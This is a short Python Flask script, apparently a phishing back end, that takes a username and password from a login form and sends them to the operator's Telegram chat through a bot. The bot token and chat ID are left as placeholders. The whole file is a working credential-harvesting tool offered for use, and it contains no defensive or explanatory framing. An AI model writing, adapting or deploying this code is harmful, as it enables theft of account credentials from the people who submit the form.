import telebot
from flask import Flask, render_template, redirect, request, url_for, flash

token = "TOKEN"
bot = telebot.TeleBot(token)
app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/message', methods=['POST', "GET"])
def message():
    if request.method == "POST":
        usr = request.form.get('username')
        password = request.form.get('password')
        if usr or password != "":
            bot.send_message("YOUR CHAT ID", f"{usr}\n{password}")
            return "hello"
        else:
            flash('please input your username and password')
            return redirect(url_for('index'))

if __name__ == "__main__":
    app.run()
    bot.polling()

# PyTelegramBotAPI==2.2.3